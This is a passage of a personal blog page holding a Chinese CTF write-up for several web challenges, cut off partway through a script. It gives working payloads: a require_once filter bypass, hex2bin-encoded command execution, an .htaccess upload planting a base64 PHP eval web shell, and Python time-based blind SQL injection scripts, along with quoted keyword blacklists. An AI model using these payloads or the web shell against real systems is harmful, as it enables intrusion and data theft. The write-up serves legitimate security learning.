@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/failure.ico">
+  
+  <title>Dest0g3 520 迎新赛部分write up | Err0r233</title>
+  <meta name="author" content="Err0r2333" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="POST, RCE, SQL_Injection, Upload" />
+  
+  <meta name="description" content="你管这叫迎新赛… 猛新啊，那没事了。 只有自己不会做的世界达成了 Misc的话… 之后再看看">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dest0g3 520 迎新赛部分write up">
+<meta property="og:url" content="http://example.com/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/index.html">
+<meta property="og:site_name" content="Err0r233">
+<meta property="og:description" content="你管这叫迎新赛… 猛新啊，那没事了。 只有自己不会做的世界达成了 Misc的话… 之后再看看">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/failure.ico">
+<meta property="article:published_time" content="2022-11-13T06:42:49.000Z">
+<meta property="article:modified_time" content="2023-03-12T09:43:56.839Z">
+<meta property="article:author" content="Err0r2333">
+<meta property="article:tag" content="SQL_Injection">
+<meta property="article:tag" content="POST">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="Upload">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/failure.ico">
+<meta name="twitter:site" content="@Err0r2333">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner3.png');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.png');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
+
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                        
+                                    
+                                        
+                                            <li>
+                                                <a><i class="fa fa-link"></i>链接</a>
+                                                <ul class="sub-menu">
+                                                    
+                                                        
+                                                    
+                                                </ul>
+                                            </li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Err0r233</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Err0r233</h2> <br />
+                        <span>Err0r233的个人博客</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">Dest0g3 520 迎新赛部分write up</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2022-11-13T06:42:49.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2022-11-13</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~8.68K
+                    
+                    字
+                </li>
+                
+                    <li id="/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/" class="leancloud_visitors" data-flag-title="Dest0g3 520 迎新赛部分write up">
+                        <i class="fa fa-eye"></i>
+                        <span class="leancloud-visitors-count"> </span> 次阅读
+                    </li>
+                    
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1678614236839"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><p>你管这叫迎新赛…</p>
+<p>猛新啊，那没事了。</p>
+<p>只有自己不会做的世界达成了</p>
+<p>Misc的话… 之后再看看</p>
+<span id="more"></span>
+<h2><span id="phpdest"> phpdest</span></h2>
+<p>require_once绕过</p>
+<hr>
+<p>require_once()：引用或者包含外部的一个php文件，但是如果已经包含过一次了，该文件不会再次被包含</p>
+<p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看见flag.php已经被包含了一次了，所以我们要进行require_once的绕过</p>
+<p>参考这篇文章的payload：</p>
+<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/83909.html">php源码分析 require_once 绕过不能重复包含文件的限制 | CN-SEC 中文网</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span></span><br></pre></td></tr></table></figure>
+<p>进行base64解码后就能获得flag</p>
+
+<p>成功获得flag</p>
+
+<h2><span id="easyphp"> EasyPHP</span></h2>
+<p>提示：Post something</p>
+<p>认识set_error_handler()</p>
+<hr>
+<p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(</span><br><span class="line">    function() <span class="keyword">use</span>(&amp;$<span class="title">fl4g</span>) &#123;</span><br><span class="line">        <span class="title">print</span> $<span class="title">fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span> Try harder!</span><br></pre></td></tr></table></figure>
+<p>上面那个if的条件肯定是实现不了的，哪里有大于24小时或者31天或者60秒的时候啊</p>
+<p>所以关键就是在set_error_handler()上了</p>
+<p>这个函数是，当报错时，就会执行</p>
+<p>也就是我们要POST传参让其报错（</p>
+<p>又因为$fl4g 和 $dest0g3之间有个. 代表拼接</p>
+<p>（例如fl4g=a dest0g3=b 之后的结果就是ab）</p>
+<p>但是php中，数组和字符串是不能拼接的，会报错</p>
+<p>所以我们传入数组</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>就会报错，执行set_error_hanlder 打印fl4g</p>
+
+<h2><span id="simplerce"> SimpleRCE</span></h2>
+<p>学到了新姿势…</p>
+<p>Try Try hex2bin</p>
+<hr>
+<p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我的妈，那叫一个地狱绘图</p>
+<p>ban掉了:  ^ 、.、`、大于号、小于号、等于号、双引号、正则preg、&amp;、|、%0、{}、$、+、\</p>
+<p>然后ban掉了常用的eval执行的命令</p>
+<p>但是，唯独少了个单引号</p>
+<p>参考了dalao的wp，发现一个神奇的函数：hex2bin()</p>
+<hr>
+<p>hex2bin()：转换十六进制字符为二进制ASCII字符串</p>
+<p>用法：hex2bin(‘hexcode’)</p>
+<p>例：<code>echo hex2bin('68656c6c6f20776f726c64');</code>  //输出Hello World</p>
+<p>所以没有过滤单引号给我们使用了hex2bin的机会</p>
+<p>只需要构造出system(‘cat /flag’)就结束了</p>
+<p><font size="5" color="violet">system --&gt; 73797374656d</font></p>
+<p><font size="5" color="violet">cat /flag --&gt; 636174202f666c6167</font></p>
+<p>也就是构造</p>
+<p><code>aaa=hex2bin('73797374656d')(hex2bin('636174202f666c6167'));</code></p>
+<p>成功获取flag</p>
+
+<hr>
+<h2><span id="funny_upload"> funny_upload</span></h2>
+<p>.htaccess的新姿势</p>
+<p>文件上传的新姿势</p>
+<hr>
+<p>打开F12可以看到如下脚本：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Checkfiles</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> fup = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fileName = fup.<span class="property">value</span>;</span><br><span class="line"><span class="keyword">var</span> ext = fileName.<span class="title function_">substring</span>(fileName.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(ext == <span class="string">&quot;gif&quot;</span> || ext == <span class="string">&quot;GIF&quot;</span> || ext == <span class="string">&quot;JPEG&quot;</span> || ext == <span class="string">&quot;jpeg&quot;</span> || ext == <span class="string">&quot;jpg&quot;</span> || ext == <span class="string">&quot;JPG&quot;</span> || ext == <span class="string">&quot;png&quot;</span> || ext == <span class="string">&quot;PNG&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;这个文件不好，我不喜欢&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>对后缀做了要求，我第一次做的时候直接传.htaccess和图片🐎蚁剑是连不上的= =</p>
+<p>看看wp，要用php包含的方式连蚁剑，我也不知道为什么，挺神奇的</p>
+<p>我们的.htaccess参数有：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php5-script .jpg  <span class="comment">//采用php5-script处理器来解析匹配到的文件</span></span><br><span class="line">SetHandler application/x-httpd-php  <span class="comment">//将该目录和子目录所有文件映射为php类型（也就是当作PHP文件解析）</span></span><br><span class="line">AddType application/x-httpd-php .jpg <span class="comment">//将特定后缀文件映射为php类型</span></span><br></pre></td></tr></table></figure>
+<p>.htaccess中使用auto_prepend_file与auto_append_file能在所有页面的顶部和底部require文件</p>
+<p>php_value auto_prepend_file 在页面顶部加载文件</p>
+<p>php_value auto_append_file 在页面底部加载文件</p>
+<p>所以我们传入的.htaccess文件内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt  <span class="comment">//将.txt文件解析为php</span></span><br><span class="line">php_value auto_append_file <span class="string">&quot;php://filter/convert.base64-decode/resource=1.txt&quot;</span></span><br><span class="line"><span class="comment">//直接加载php://filter/convert.base64-decode/resource=1.txt（很熟悉吧，如果成功上传，就会在文件的底部加上1.txt base64解码的东西）</span></span><br></pre></td></tr></table></figure>
+
+<p>然后传个1.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;  --&gt;base64 encode</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接，找到flag</p>
+
+
+<hr>
+<h2><span id="really-easy-sql"> Really Easy SQL</span></h2>
+<p>延时盲注（过滤sleep()，substr()）</p>
+<hr>
+<p>输入啥都没反应，由于又是SQL注入，很容易想到延时盲注</p>
+<p>提示是insert注入</p>
+<p>所以payload的格式有：<code>0' or payload or' </code></p>
+<p>采用NewStarCTF的延时盲注脚本就可以了</p>
+<p>但是这里直接使用会发现啥也没有，那肯定是过滤了字段</p>
+<p>找了找writeup：</p>
+<p>发现给了黑名单</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;updatexml&#x27;</span>,<span class="string">&#x27;order&#x27;</span>,<span class="string">&#x27;by&#x27;</span>,<span class="string">&#x27;substr&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;extractvalue&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;alter&#x27;</span>,<span class="string">&#x27;handler&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;like&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;offset&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;case&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;load&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>过滤sleep和substr</p>
+<p>所以我们的payload修改下，mid能够替换substr，benchmark能替换sleep</p>
+<p>benchmark：让数据库反复多次做一件事，增大延迟（比如执行2500000次的MD5加密）</p>
+<span class="blur">这个benchmark的误差真的太大了，注意使用时按照延迟修改下keep>的参数</span>
+<span class="blur">尤其是跑table和column的时候，那个误差，会输出全是~</span>
+<p>同样使用二分脚本即可，payload编写方式与NewStarCTF 的延时盲注一致</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url =<span class="string">&#x27;http://8339f26b-3e1c-4fac-ab18-04b68c3e6279.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right =<span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt; right):</span><br><span class="line">        payload=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">            <span class="comment">#&#x27;password&#x27; : &quot;0&#x27;||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#&#x27;password&#x27; : &quot;0&#x27;||if(ascii(mid((select(group_concat(column_name))from(information_schema.tables)where(table_name=&#x27;flaggg&#x27;)),%d,1))&lt;%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;%(i,mid)</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> : <span class="string">&quot;0&#x27;||if(ascii(mid((select(group_concat(cmd))from(flaggg)),%d,1))&lt;%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;</span>%(i,mid)</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">#这里使用管道符||替代or，但是黑名单是没有过滤or的，如果使用or的话需要多加一个括号</span></span><br><span class="line"></span><br><span class="line">        times = time.time()</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        timee = time.time()</span><br><span class="line">        keep = timee-times</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> keep &gt; <span class="number">1.8</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mid &lt;=<span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res+=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>同样的，睡一觉起来就能拿到flag了</p>
+<p>先去睡会吧~</p>
+
+<p>不通顺的地方我也没办法，benchmark真的就是误差太大了，我这边使用3000000次和1.8能跑出flag</p>
+
+<h2><span id="easysql"> EasySQL</span></h2>
+<p>和上一题是一样的，但是过滤了大小于号…</p>
+<p>那么我们就不能够用二分跑了，只能一个个遍历，我靠</p>
+<p>用二分能够稍微提速，遍历那就是坐牢中的坐牢了（我手机点完外卖了都没跑完一个）</p>
+<p>同样写脚本，只需要注意什么时候中断循环就行了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&#x27;http://b200590b-0cb2-40ff-9914-1837b3815604.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>,<span class="number">32</span>,-<span class="number">1</span>):</span><br><span class="line">        a = <span class="number">0</span></span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">            <span class="comment">#&#x27;password&#x27; : &quot;0&#x27;||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;%(i,j)</span></span><br><span class="line">            <span class="comment">#&#x27;password&#x27; : &quot;0&#x27;||if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),%d,1))=%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;%(i,j)</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> : <span class="string">&quot;0&#x27;||if(ascii(mid((select(group_concat(cmd))from(flaggg)),%d,1))=%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;</span>%(i,j)</span><br><span class="line">            &#125;</span><br><span class="line">        times = time.time()</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        timee = time.time()</span><br><span class="line">        keep = timee-times</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> keep &gt; <span class="number">1.8</span>:</span><br><span class="line">            res+=<span class="built_in">chr</span>(j)<span class="comment">#不是二分查询了，所以直接相等就行了</span></span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span> <span 